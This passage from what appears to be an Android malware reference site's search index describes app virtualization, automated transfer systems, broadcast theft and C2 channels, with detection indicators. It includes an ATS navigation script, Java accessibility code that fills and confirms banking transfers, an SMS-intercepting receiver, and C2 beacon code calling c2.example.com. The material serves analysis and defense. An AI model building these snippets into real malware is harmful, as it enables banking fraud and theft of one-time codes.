\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u2502  \u2502  \u2502\n\u2502  \u2502  \u2502  \u2502  Real Banking App     \u2502  \u2502  \u2502  \u2502\n\u2502  \u2502  \u2502  \u2502  (unmodified APK)     \u2502  \u2502  \u2502  \u2502\n\u2502  \u2502  \u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2502  \u2502  \u2502\n\u2502  \u2502  \u2502  + Xposed Hooking Module    \u2502  \u2502  \u2502\n\u2502  \u2502  \u2502  + Credential Logger        \u2502  \u2502  \u2502\n\u2502  \u2502  \u2502  + Network Interceptor      \u2502  \u2502  \u2502\n\u2502  \u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2502  \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n        \u2502\n        \u25bc Android Framework (proxied)\n</code></pre> <p>The virtualization engine provides:</p> <ul> <li>Virtual filesystem: Isolated <code>/data/data/</code> for the guest app</li> <li>Virtual Process IDs: The guest app believes it has its own PID</li> <li>StubActivity: A blank activity declared in the host's manifest that Android launches. The virtualization engine renders the guest app's UI inside it.</li> <li>Intent interception: System intents directed at the guest app are intercepted and routed through the virtual container</li> </ul>"},{"location":"attacks/app-virtualization/#intent-redirection","title":"Intent Redirection","text":"<p>When the victim launches the real banking app, the malware's accessibility service intercepts the intent and redirects it to the StubActivity, which boots a virtual instance of the banking app inside the container. The user sees the real banking app UI but inside the malware's sandbox.</p>"},{"location":"attacks/app-virtualization/#credential-capture-via-hooking","title":"Credential Capture via Hooking","text":"<p>Inside the virtual container, a hooking framework (Xposed, Frida, or custom hooks) injects into the guest app's process:</p> <ul> <li>UI hooks: Capture text entered into login fields</li> <li>Network hooks: Intercept OkHttpClient, HttpURLConnection, and WebView network calls to read credentials in transit</li> <li>Crypto hooks: Log encryption keys and plaintext before encryption</li> </ul>"},{"location":"attacks/app-virtualization/#why-standard-defenses-fail","title":"Why Standard Defenses Fail","text":"Defense Why It Fails Root detection Virtualization doesn't require root. Device appears unrooted. SafetyNet / Play Integrity Checks run in the host app's context or are proxied with clean responses APK signature verification The banking app's APK is unmodified. Signature is valid. Accessibility service detection The hooking happens inside the virtual container, not via Android's accessibility framework Repackaging detection No repackaging occurred. The original APK runs as-is. SSL certificate pinning Can be bypassed by hooks inside the container, or the proxy layer terminates TLS"},{"location":"attacks/app-virtualization/#frameworks-abused","title":"Frameworks Abused","text":"Framework Type Origin Malware Usage VirtualApp Open-source app-level virtualization Originally lody/VirtualApp on GitHub GodFather (2025), FjordPhantom (2023), adware (2017+) VirtualXposed VirtualApp + Xposed integration GitHub GodFather (2025) DroidPlugin Open-source plugin framework 360 Mobile Security PluginPhantom (2016), adware (2017+) Parallel Space / DualSpace Commercial dual-instance apps Google Play (100M+ downloads) Account cloning, 2FA bypass"},{"location":"attacks/app-virtualization/#malware-families","title":"Malware Families","text":""},{"location":"attacks/app-virtualization/#fjordphantom","title":"FjordPhantom","text":"<p>First banking trojan to weaponize full app-level virtualization. Discovered by Promon in November 2023, first observed spreading in Southeast Asia in September 2023.</p> Attribute Detail First seen September 2023 Targets Banking apps in Indonesia, Thailand, Vietnam, Singapore, Malaysia Virtualization base VirtualApp (modified open-source) Hooking Java hooking framework injected into container Distribution Email, SMS, messaging apps with social engineering Impact $280,000 stolen from a single victim <p>Promon tested 113 top global banking apps and found 80% were vulnerable to this attack vector. FjordPhantom hooks Accessibility services, GooglePlayServices, and UI functions inside the virtual container. Because the original app is unmodified, repackaging detection is bypassed entirely.</p>"},{"location":"attacks/app-virtualization/#godfather-virtualization-variant","title":"GodFather (Virtualization Variant)","text":"<p>GodFather added on-device virtualization in June 2025, replacing its previous overlay-based approach. Disclosed by Zimperium zLabs.</p> Attribute Detail Virtualization added June 2025 Targets ~12 Turkish financial institutions (Akbank, Garanti BBVA, Halkbank, ING, Ziraat), scans ~500 apps globally Virtualization base VirtualApp engine Hooking Xposed framework for Java-layer API hooking Anti-analysis ZIP manipulation, <code>$JADXBLOCK</code> fields in manifest to defeat jadx <p>GodFather's StubActivity acts as an intermediary: Android believes it is launching the legitimate app, but the malware controls what renders on screen. When the victim launches the real banking app, GodFather's accessibility service intercepts the Intent and redirects it to the StubActivity. Xposed hooks inject into network libraries (OkHttpClient) to intercept API calls, recording credentials, passwords, PINs, and touch events.</p>"},{"location":"attacks/app-virtualization/#pluginphantom","title":"PluginPhantom","text":"<p>First known Android trojan to abuse a plugin/virtualization framework. Discovered by Palo Alto Networks Unit 42 in November 2016.</p> <p>Used the DroidPlugin framework to load malicious functionality as plugin APKs without installation. Each plugin implemented a separate capability (file theft, location tracking, keylogging, SMS interception, audio recording, screenshot capture, camera access). Plugins could be updated dynamically without reinstalling the host app.</p>"},{"location":"attacks/app-virtualization/#goldfactory-modified-banking-apps","title":"GoldFactory (Modified Banking Apps)","text":"<p>Chinese-speaking threat group active since June 2023. Rather than running apps inside a virtual container, GoldFactory takes original banking APKs and injects malicious code while preserving normal functionality. Uses three different runtime hooking frameworks: FriHook, SkyHook, and PineHook.</p> <p>Over 300 unique modified banking app samples identified, leading to 11,000+ infections across Thailand, Vietnam, and Indonesia. Their GoldPickaxe variant harvests facial biometric data for deepfake-based bank fraud.</p>"},{"location":"attacks/app-virtualization/#adware-and-plugin-framework-abuse","title":"Adware and Plugin Framework Abuse","text":"<p>Before banking trojans adopted virtualization, adware campaigns abused these frameworks at scale. Unit 42 documented 32 apps abusing DroidPlugin and 21 abusing VirtualApp on Google Play in early 2017. At Black Hat Asia 2017, Palo Alto Networks researchers presented \"Anti-Plugin,\" identifying 64,058 samples using plugin technology, of which 61,172 were malicious or gray.</p>"},{"location":"attacks/app-virtualization/#academic-research","title":"Academic Research","text":"Paper Venue Year Key Finding App in the Middle ACM SIGMETRICS 2019 7 attack vectors in 32 virtualization frameworks; 164 credential-stealing repackaged apps found Parallel Space Traveling ACM SACMAT 2020 160+ virtualization apps analyzed; apps in virtual environments not isolated from each other Mascara arXiv 2020 Automated attack framework building virtual environments for credential theft; proposed ArtMethod-based detection VAHunt ACM CCS 2020 Detected 139,000+ virtualization-based malware samples with 0.7% false negatives, zero false positives Virtualization Pen Testing arXiv 2026 Tested FjordPhantom-style attacks against 83 banking apps (405M+ downloads) in East/Southeast Asia"},{"location":"attacks/app-virtualization/#timeline","title":"Timeline","text":"Date Event 2015-2016 VirtualApp and DroidPlugin open-sourced; Parallel Space hits 100M downloads November 2016 PluginPhantom discovered -- first trojan abusing DroidPlugin January 2017 Adware campaigns on Google Play abusing VirtualApp and DroidPlugin (53 apps found) April 2017 Black Hat Asia 2017 -- 64K malicious plugin samples identified November 2020 VAHunt detects 139K+ virtualization-based malware samples September 2023 FjordPhantom first observed in Southeast Asia November 2023 Promon discloses FjordPhantom -- first banking trojan using full app virtualization June 2025 GodFather virtualization variant disclosed by Zimperium December 2025 GoldFactory campaign hits Southeast Asia with modified banking apps, 11K+ infections"},{"location":"attacks/app-virtualization/#detection","title":"Detection","text":"Indicators of Virtualization <ul> <li>Presence of VirtualApp, DroidPlugin, or VirtualXposed libraries in APK</li> <li><code>StubActivity</code> or similarly named proxy activities in the manifest</li> <li>Multiple app processes running under a single UID</li> <li>Abnormal file paths (<code>/data/data/&lt;host_package&gt;/virtual/...</code>)</li> <li>Xposed framework indicators inside app memory</li> <li>Network traffic from unexpected process contexts</li> </ul> App-Side Detection <ul> <li>Check if the app is running inside a virtual environment by inspecting the calling package</li> <li>Verify <code>Application.getProcessName()</code> matches expected package name</li> <li>Check for VirtualApp-specific system properties</li> <li>Inspect <code>/proc/self/maps</code> for injected libraries from known virtualization frameworks</li> <li>Detect Xposed by checking for <code>de.robv.android.xposed</code> class loading</li> </ul> <p>Appdome documents \"Second Space\" and \"Parallel App\" attacks as a fraud vector. Licelus (DexProtector) notes that the virtualization app is a more privileged process than any target app, giving it unrestricted interaction capabilities.</p>"},{"location":"attacks/automated-transfer-systems/","title":"Automated Transfer Systems (ATS)","text":"<p>On-device fraud that automates money transfers without user interaction. Rather than stealing credentials and replaying them from an attacker-controlled device, ATS operates the victim's real banking app directly using accessibility services. The transaction originates from the victim's trusted device, IP address, and session -- making it nearly invisible to bank-side fraud detection.</p> <p>See also: Accessibility Abuse, Overlay Attacks, Notification Suppression, Device Wipe &amp; Ransomware</p> <p>Requirements</p> Requirement Details Permission <code>BIND_ACCESSIBILITY_SERVICE</code> Banking App Target banking app installed and authenticated Configuration Recipient account, transfer amount, app-specific UI navigation script"},{"location":"attacks/automated-transfer-systems/#ats-vs-overlay-vs-vnc","title":"ATS vs Overlay vs VNC","text":"<p>Three distinct approaches to banking fraud, often combined within a single family.</p> Aspect Overlay ATS VNC / RAT Where fraud happens Attacker's device (credentials exfiltrated) Victim's device (automated) Victim's device (remote-controlled) Credential exfiltration Yes -- sent to C2 Not required (uses existing session) Optional Detection by bank Different device/IP/fingerprint Same device, same session Same device, same session Operator involvement Manual (attacker logs in remotely) None (fully scripted) Manual (attacker controls device live) Scalability Moderate (requires human operators) High (runs unattended) Low (1:1 operator-to-victim ratio) Behavioral biometrics Fails (different typing/interaction patterns) Can mimic human behavior Partially detectable"},{"location":"attacks/automated-transfer-systems/#how-ats-works","title":"How ATS Works","text":""},{"location":"attacks/automated-transfer-systems/#the-transfer-workflow","title":"The Transfer Workflow","text":"<ol> <li>Wait for authentication -- the malware waits for the user to log into the banking app, or triggers the app open and uses previously stolen credentials via overlay</li> <li>Navigate to transfer screen -- accessibility gestures scroll, tap menu items, and navigate to the money transfer section</li> <li>Fill transfer fields -- the recipient IBAN/account and amount are injected into text fields using <code>AccessibilityNodeInfo.ACTION_SET_TEXT</code></li> <li>Confirm transaction -- the malware clicks through confirmation dialogs, including \"Are you sure?\" screens</li> <li>Handle 2FA -- intercepts SMS OTP from notifications or reads it via <code>NotificationListenerService</code>, then enters it into the confirmation field</li> <li>Clean up -- deletes confirmation SMS, dismisses push notifications from the bank, clears recent transactions view if possible</li> </ol>"},{"location":"attacks/automated-transfer-systems/#anti-detection-during-transfer","title":"Anti-Detection During Transfer","text":"<p>ATS families employ stealth measures to prevent the user from noticing the fraud in progress:</p> Technique Purpose Implementation Screen brightness to 0 User cannot see device activity <code>Settings.System.SCREEN_BRIGHTNESS</code> set to 0 Mute all audio Suppress notification sounds <code>AudioManager.setStreamMute()</code> on all streams Enable Do Not Disturb Block incoming calls/notifications during transfer <code>NotificationManager.setInterruptionFilter()</code> Black overlay Cover screen with opaque window <code>TYPE_APPLICATION_OVERLAY</code> with <code>Color.BLACK</code> Fake \"updating\" screen Explain device unresponsiveness Overlay displaying \"System update in progress...\" Disable notifications Prevent bank alerts during transfer Accessibility dismisses notifications as they arrive Lock user out Prevent interference mid-transfer Custom lock screen overlay or <code>GLOBAL_ACTION_LOCK_SCREEN</code>"},{"location":"attacks/automated-transfer-systems/#scripting-engines","title":"Scripting Engines","text":"<p>Early ATS implementations were hardcoded per banking app. Modern families use configurable scripting systems.</p> <p>Xenomorph v3 ATS Engine: introduced a JSON-based scripting language that defines UI navigation as a sequence of operations. Scripts are downloaded from C2 per target app, making it possible to add new bank targets without updating the malware binary.</p> Xenomorph v3 ATS Script Example <pre><code>{\n  \"module\": \"ats\",\n  \"target\": \"com.target.bankapp\",\n  \"steps\": [\n    {\"action\": \"open_app\", \"package\": \"com.target.bankapp\"},\n    {\"action\": \"wait\", \"condition\": \"text_visible\", \"value\": \"Transfer\"},\n    {\"action\": \"click\", \"selector\": {\"text\": \"Transfer\"}},\n    {\"action\": \"set_text\", \"selector\": {\"id\": \"recipient_field\"}, \"value\": \"&lt;iban&gt;\"},\n    {\"action\": \"set_text\", \"selector\": {\"id\": \"amount_field\"}, \"value\": \"&lt;amount&gt;\"},\n    {\"action\": \"click\", \"selector\": {\"text\": \"Confirm\"}},\n    {\"action\": \"wait\", \"condition\": \"text_visible\", \"value\": \"SMS code\"},\n    {\"action\": \"set_text\", \"selector\": {\"id\": \"otp_field\"}, \"value\": \"&lt;intercepted_sms&gt;\"}\n  ]\n}\n</code></pre> <p>SharkBot: uses a similar declarative approach where each target bank has a configuration defining the UI element IDs, button text, and navigation paths. The C2 pushes updated configs when banking apps change their UI.</p> <p>Hook / Octo: instead of scripted ATS, these families provide full VNC-based remote access, letting the operator navigate the banking app manually. This is more flexible but less scalable.</p>"},{"location":"attacks/automated-transfer-systems/#bypassing-transaction-limits","title":"Bypassing Transaction Limits","text":"<p>Banks enforce per-transaction and daily transfer limits. ATS handles this by:</p> <ul> <li>Splitting transfers -- breaking a large amount into multiple smaller transfers below the per-transaction threshold</li> <li>Modifying beneficiary lists -- adding the mule account to the trusted recipient list first (some banks skip 2FA for trusted recipients)</li> <li>Timing across days -- spreading transfers across multiple days to stay under daily limits</li> <li>Draining all accounts -- iterating through savings, checking, and linked accounts</li> </ul>"},{"location":"attacks/automated-transfer-systems/#account-takeover-workflow","title":"Account Takeover Workflow","text":"<p>A full ATS-driven account takeover chains multiple techniques:</p> <ol> <li>Victim installs dropper from phishing SMS or Play Store</li> <li>Dropper requests accessibility permission via social engineering overlay</li> <li>Malware uses accessibility to auto-grant all additional permissions</li> <li>Overlay phishes banking credentials when user opens banking app</li> <li>Malware waits for idle period (typically 2-4 AM local time)</li> <li>ATS opens banking app, authenticates with stolen credentials</li> <li>ATS changes registered phone number and email to attacker-controlled values</li> <li>ATS initiates transfer, intercepts OTP, confirms transaction</li> <li>ATS repeats until accounts are drained or limits are hit</li> <li>Some families wipe the device post-fraud to destroy evidence (BRATA, BingoMod)</li> </ol>"},{"location":"attacks/automated-transfer-systems/#families-with-ats-capability","title":"Families With ATS Capability","text":"Family ATS Type Scripting First ATS Version Targets Gustuff Scripted Hardcoded per app 2019 Australian banks Cerberus Scripted Hardcoded v2 (2020) European banks SharkBot Scripted JSON config v1 (2021) EU/UK banks Anatsa Scripted Configurable 2021 EU/US banks Ermac Scripted Hardcoded v2 (2022) 400+ targets Xenomorph Scripted JSON ATS engine v3 (2023) 400+ targets Hook VNC + ATS Operator-assisted 2023 400+ targets Octo VNC + ATS Operator-assisted v2 (2023) 200+ targets GodFather Scripted Configurable v2 (2023) 400+ targets Medusa VNC-based Operator-controlled v2 (2024) European banks BingoMod VNC + scripted Hybrid 2024 Italian banks TsarBot Scripted Configurable 2024 750+ targets Copybara VNC + scripted Hybrid 2024 Italian banks Herodotus Scripted Human behavior mimicry 2025 EU banks"},{"location":"attacks/automated-transfer-systems/#accessibility-code-for-ats","title":"Accessibility Code for ATS","text":"Core accessibility operations used in ATS <pre><code>public void fillField(AccessibilityNodeInfo root, String viewId, String value) {\n    List&lt;AccessibilityNodeInfo&gt; nodes = root.findAccessibilityNodeInfosByViewId(viewId);\n    if (!nodes.isEmpty()) {\n        Bundle args = new Bundle();\n        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, value);\n        nodes.get(0).performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);\n    }\n}\n\npublic void clickButton(AccessibilityNodeInfo root, String buttonText) {\n    List&lt;AccessibilityNodeInfo&gt; nodes = root.findAccessibilityNodeInfosByText(buttonText);\n    for (AccessibilityNodeInfo node : nodes) {\n        if (node.isClickable()) {\n            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);\n            return;\n        }\n        AccessibilityNodeInfo parent = node.getParent();\n        if (parent != null &amp;&amp; parent.isClickable()) {\n            parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);\n            return;\n        }\n    }\n}\n\npublic void navigateToTransfer(AccessibilityService service) {\n    Intent intent = service.getPackageManager()\n        .getLaunchIntentForPackage(\"com.target.bankapp\");\n    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);\n    service.startActivity(intent);\n}\n</code></pre>"},{"location":"attacks/automated-transfer-systems/#android-mitigations","title":"Android Mitigations","text":"Version Restriction ATS Impact Android 7 Background execution limits Minimal -- accessibility runs as foreground service Android 10 Background activity launch restrictions ATS must wait for user interaction or use <code>USE_FULL_SCREEN_INTENT</code> Android 13 Restricted settings for sideloaded apps Accessibility harder to enable -- bypassed via session-based install Android 13 Non-dismissible notification for active accessibility User may notice -- malware hides behind legitimate-looking service name Android 14 Accessibility declaration restrictions Apps must declare specific accessibility capabilities Android 15 Expanded restricted settings enforcement Closes session-installer bypass for some OEMs <p>Fundamental Limitation</p> <p>Once accessibility is granted, there is no OS-level mechanism to distinguish ATS operations from legitimate accessibility tool usage. The permission model is all-or-nothing.</p>"},{"location":"attacks/automated-transfer-systems/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li>Accessibility service config requesting <code>flagDefault</code> or <code>flagRetrieveInteractiveWindows</code></li> <li>References to banking app package names in strings or assets</li> <li><code>ACTION_SET_TEXT</code> and <code>ACTION_CLICK</code> usage patterns on <code>AccessibilityNodeInfo</code></li> <li>JSON/XML configuration files mapping package names to UI navigation sequences</li> <li><code>AudioManager</code>, <code>Settings.System.SCREEN_BRIGHTNESS</code> manipulation</li> </ul> Dynamic Indicators <ul> <li>Accessibility service performing actions while screen is off or brightness is 0</li> <li>Automated navigation through banking app UI at non-human speeds</li> <li>SMS read/delete operations immediately following a transfer confirmation</li> <li>Network traffic to C2 containing transaction confirmation details</li> </ul> Frida Hook to Intercept ATS Actions <pre><code>Java.perform(function() {\n    var ANI = Java.use(\"android.view.accessibility.AccessibilityNodeInfo\");\n    ANI.performAction.overload(\"int\", \"android.os.Bundle\").implementation = function(action, args) {\n        if (action === 0x200000) {\n            console.log(\"[ATS] SET_TEXT: \" + args.getCharSequence(\"ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE\"));\n        }\n        if (action === 0x10) {\n            console.log(\"[ATS] CLICK on: \" + this.getViewIdResourceName());\n        }\n        return this.performAction(action, args);\n    };\n});\n</code></pre>"},{"location":"attacks/broadcast-theft/","title":"Broadcast Theft","text":"<p>Intercepting broadcast intents meant for other apps. Android's broadcast system sends messages to all registered receivers. If a broadcast carries sensitive data and isn't properly protected, any app can register a receiver and read it.</p> <p>Requirements</p> Requirement Details Permission Varies. Some broadcasts require permissions (e.g., <code>RECEIVE_SMS</code>). Others are unprotected. Condition Target broadcast is not permission-protected or is ordered"},{"location":"attacks/broadcast-theft/#how-broadcasts-work","title":"How Broadcasts Work","text":"<p>An app sends a broadcast, and all registered <code>BroadcastReceiver</code> components matching the intent filter receive it. Two types:</p> <p>Normal broadcasts (<code>sendBroadcast()</code>): delivered to all receivers simultaneously. No ordering, no priority, no ability to cancel.</p> <p>Ordered broadcasts (<code>sendOrderedBroadcast()</code>): delivered sequentially by priority. Higher-priority receivers run first and can modify or cancel the broadcast before lower-priority receivers see it.</p>"},{"location":"attacks/broadcast-theft/#attack-patterns","title":"Attack Patterns","text":""},{"location":"attacks/broadcast-theft/#sms-interception","title":"SMS Interception","text":"<p>The <code>SMS_RECEIVED</code> broadcast is ordered. Malware registers a receiver with maximum priority:</p> <pre><code>&lt;receiver android:name=\".SmsReceiver\" android:exported=\"true\"&gt;\n    &lt;intent-filter android:priority=\"999\"&gt;\n        &lt;action android:name=\"android.provider.Telephony.SMS_RECEIVED\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/receiver&gt;\n</code></pre> <p>The malware receives the SMS first, extracts the OTP, and can call <code>abortBroadcast()</code> to prevent the default SMS app from showing it. The user never sees the message.</p> <p>On Android 4.4+, only the default SMS app can abort SMS broadcasts, but malware can still read the content and forward it without aborting.</p>"},{"location":"attacks/broadcast-theft/#sticky-broadcast-leakage","title":"Sticky Broadcast Leakage","text":"<p>Sticky broadcasts (deprecated in API 21) persist after being sent. Any app calling <code>registerReceiver()</code> with the matching filter receives the last sticky broadcast. This was used to leak battery status, charging state, and other system info.</p> <p><code>ACTION_BATTERY_CHANGED</code> is still a sticky broadcast and leaks detailed battery information without any permission.</p>"},{"location":"attacks/broadcast-theft/#custom-broadcast-interception","title":"Custom Broadcast Interception","text":"<p>Apps that define custom broadcast actions without permission protection are vulnerable:</p> <pre><code>sendBroadcast(new Intent(\"com.myapp.USER_LOGGED_IN\")\n    .putExtra(\"token\", authToken));\n</code></pre> <p>Any app with a matching receiver sees this:</p> <pre><code>&lt;receiver android:name=\".TokenStealer\" android:exported=\"true\"&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"com.myapp.USER_LOGGED_IN\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/receiver&gt;\n</code></pre>"},{"location":"attacks/broadcast-theft/#boot-broadcast-race","title":"Boot Broadcast Race","text":"<p>Multiple apps receiving <code>BOOT_COMPLETED</code> race to start. Malware that starts first can interfere with security software that starts later.</p>"},{"location":"attacks/broadcast-theft/#security-relevant-system-broadcasts","title":"Security-Relevant System Broadcasts","text":"Broadcast Data Exposed Permission Required <code>SMS_RECEIVED</code> SMS content, sender <code>RECEIVE_SMS</code> <code>WAP_PUSH_RECEIVED</code> MMS push data <code>RECEIVE_WAP_PUSH</code> <code>NEW_OUTGOING_CALL</code> Dialed number <code>PROCESS_OUTGOING_CALLS</code> <code>PHONE_STATE</code> Call state, phone number <code>READ_PHONE_STATE</code> <code>BATTERY_CHANGED</code> Battery level, charging, temperature None <code>CONNECTIVITY_CHANGE</code> Network state changes None (deprecated API 28) <code>PACKAGE_ADDED/REMOVED</code> Package name of installed/removed app None <code>BOOT_COMPLETED</code> Device booted <code>RECEIVE_BOOT_COMPLETED</code>"},{"location":"attacks/broadcast-theft/#android-mitigations","title":"Android Mitigations","text":"Version Mitigation Bypass Android 3.1 (API 12) Apps in stopped state don't receive broadcasts Must be launched once; malware is typically already running Android 4.4 (API 19) Only default SMS app can abort <code>SMS_RECEIVED</code> Malware can still read SMS content without aborting Android 5.0 (API 21) Sticky broadcasts deprecated Legacy sticky broadcasts like <code>ACTION_BATTERY_CHANGED</code> still work Android 8.0 (API 26) Implicit broadcast restrictions; most not delivered to manifest receivers Exempt broadcasts (<code>BOOT_COMPLETED</code>, <code>SMS_RECEIVED</code>) still delivered; dynamic registration still works Android 14 (API 34) Context-registered receivers must declare <code>RECEIVER_EXPORTED</code> or <code>RECEIVER_NOT_EXPORTED</code> Malware explicitly sets <code>RECEIVER_EXPORTED</code>"},{"location":"attacks/broadcast-theft/#families-using-this-technique","title":"Families Using This Technique","text":"<p>SMS and broadcast interception is used by virtually every banking trojan for OTP theft. This table covers the primary use case for each family.</p> Family Broadcast Type Purpose Cerberus SMS_RECEIVED 2FA OTP interception Anubis SMS_RECEIVED OTP theft, SMS forwarding to C2 Hook SMS_RECEIVED OTP interception during ATS Ermac SMS_RECEIVED 2FA bypass GodFather SMS_RECEIVED, PHONE_STATE OTP theft, call state monitoring Hydra SMS_RECEIVED OTP interception Octo SMS_RECEIVED OTP interception during remote access Medusa SMS_RECEIVED 2FA bypass Xenomorph SMS_RECEIVED OTP capture for ATS engine Anatsa SMS_RECEIVED OTP theft during automated transfers FluBot SMS_RECEIVED OTP theft, SMS worm propagation Joker SMS_RECEIVED Premium subscription OTP confirmation GriftHorse SMS_RECEIVED Premium SMS confirmation interception Harly SMS_RECEIVED Subscription confirmation codes SpyNote SMS_RECEIVED, PHONE_STATE Full SMS/call surveillance Rafel RAT SMS_RECEIVED SMS interception, ransomware unlock codes TrickMo SMS_RECEIVED OTP theft, originally TrickBot 2FA bypass Vultur SMS_RECEIVED OTP interception SharkBot SMS_RECEIVED OTP capture for ATS Chameleon SMS_RECEIVED 2FA bypass after biometric prompt disable Mamont SMS_RECEIVED Notification and SMS interception TsarBot SMS_RECEIVED OTP capture, 750+ target apps Antidot SMS_RECEIVED 2FA interception Crocodilus SMS_RECEIVED OTP theft during DTO Copybara SMS_RECEIVED OTP interception Fakecalls NEW_OUTGOING_CALL Call interception and redirection MoqHao SMS_RECEIVED, PACKAGE_ADDED SMS theft, app install monitoring Alien SMS_RECEIVED Notification sniffing for 2FA codes BRATA SMS_RECEIVED OTP theft before factory reset BankBot SMS_RECEIVED Early SMS-based OTP theft Albiriox SMS_RECEIVED OTP interception FireScam SMS_RECEIVED Notification and SMS interception across all apps DeVixor SMS_RECEIVED OTP interception for Iranian banking fraud <p>Fakecalls is unique in using <code>NEW_OUTGOING_CALL</code> to intercept outgoing calls to bank numbers and redirect them to attacker-controlled lines with pre-recorded IVR audio.</p>"},{"location":"attacks/broadcast-theft/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li><code>BroadcastReceiver</code> with high <code>android:priority</code> (especially for <code>SMS_RECEIVED</code>)</li> <li>Receivers for system broadcasts containing sensitive data</li> <li>Custom broadcasts sent with sensitive extras and no permission parameter</li> <li><code>sendBroadcast()</code> without <code>LocalBroadcastManager</code> for internal communication</li> </ul> Dynamic Indicators <ul> <li>SMS content forwarded to C2 immediately after receipt</li> <li><code>abortBroadcast()</code> calls inside SMS receivers (suppressing notifications)</li> <li>Broadcast receivers triggering network exfiltration on <code>BOOT_COMPLETED</code></li> <li>Multiple apps competing for the same ordered broadcast</li> </ul>"},{"location":"attacks/c2-techniques/","title":"C2 Communication Techniques","text":"<p>How Android malware talks to its command-and-control infrastructure. The C2 channel determines how commands reach the device, how stolen data leaves, and how resilient the operation is against takedowns. Most families use multiple channels for redundancy.</p> <p>See also: Network Traffic Interception, Anti-Analysis Techniques</p> <p>Requirements</p> Requirement Details Permission <code>INTERNET</code> (auto-granted, normal protection level) Optional <code>RECEIVE_SMS</code> for SMS-based C2, <code>RECEIVE_BOOT_COMPLETED</code> for persistent reconnection Infrastructure At least one C2 server, domain, or third-party service account"},{"location":"attacks/c2-techniques/#c2-methods","title":"C2 Methods","text":""},{"location":"attacks/c2-techniques/#httphttps-rest-apis","title":"HTTP/HTTPS REST APIs","text":"<p>The most common C2 channel. Malware sends HTTP POST requests to a hardcoded or dynamically resolved endpoint, typically JSON-encoded. The C2 responds with commands in the same format.</p> <pre><code>URL url = new URL(\"https://c2.example.com/gate.php\");\nHttpURLConnection conn = (HttpURLConnection) url.openConnection();\nconn.setRequestMethod(\"POST\");\nconn.setRequestProperty(\"Content-Type\", \"application/json\");\nconn.setDoOutput(true);\n\nJSONObject payload = new JSONObject();\npayload.put(\"bot_id\", deviceId);\npayload.put(\"action\", \"register\");\npayload.put(\"apps\", installedPackages);\n\nOutputStream os = conn.getOutputStream();\nos.write(payload.toString().getBytes());\nos.flush();\n</code></pre> <p>Advantages: works through any network, blends with normal traffic, easy to implement. Disadvantages: requires active server, domains can be seized, traffic is inspectable if pinning is absent.</p> <p>Used by: BRATA, Hydra, Cerberus, Octo, most banking trojans.</p>"},{"location":"attacks/c2-techniques/#websocket-persistent-connections","title":"WebSocket Persistent Connections","text":"<p>Maintains a persistent bidirectional connection for real-time command delivery. The C2 server can push commands instantly without polling.</p> <pre><code>OkHttpClient client = new OkHttpClient();\nRequest request = new Request.Builder()\n    .url(\"wss://c2.example.com/ws\")\n    .build();\n\nWebSocket ws = client.newWebSocket(request, new WebSocketListener() {\n    @Override\n    public void onMessage(WebSocket webSocket, String text) {\n        JSONObject cmd = new JSONObject(text);\n        executeCommand(cmd.getString(\"type\"), cmd);\n    }\n});\n</code></pre> <p>Lower latency than polling HTTP. Enables interactive remote access sessions -- screen streaming, real-time VNC. Connection drop is immediately visible to both sides.</p> <p>Used by: Hook, Medusa, Octo v2.</p>"},{"location":"attacks/c2-techniques/#firebase-cloud-messaging-fcm","title":"Firebase Cloud Messaging (FCM)","text":"<p>Abuses Google's push notification infrastructure as a C2 wake-up channel. The malware registers with FCM using the attacker's Firebase project credentials, then receives push messages containing commands. FCM traffic is indistinguishable from legitimate app notifications.</p> <pre><code>FirebaseMessaging.getInstance().getToken()\n    .addOnCompleteListener(task -&gt; {\n        String token = task.getResult();\n        sendTokenToC2(token);\n    });\n</code></pre> <pre><code>public class C2MessagingService extends FirebaseMessagingService {\n    @Override\n    public void onMessageReceived(RemoteMessage message) {\n        Map&lt;String, String&gt; data = message.getData();\n        String command = data.get(\"cmd\");\n        String args = data.get(\"args\");\n        executeCommand(command, args);\n    }\n}\n</code></pre> <p>Google can revoke the Firebase project, but the attacker just creates a new one. The malware often uses FCM only as a wake-up signal, then connects back to the primary HTTP C2 for actual data transfer.</p> <p>Used by: Ermac, Cerberus, GodFather, Anatsa.</p>"},{"location":"attacks/c2-techniques/#telegram-bot-api","title":"Telegram Bot API","text":"<p>Uses Telegram's Bot API for bidirectional C2. The malware contains a bot token and chat ID, sends stolen data as Telegram messages, and polls <code>getUpdates</code> for commands. Telegram's infrastructure provides built-in encryption, CDN distribution, and censorship resistance.</p> Telegram Bot API C2 Implementation <pre><code>String botToken = \"6234871:AAF...encrypted_token\";\nString chatId = \"-100198765432\";\nString apiUrl = 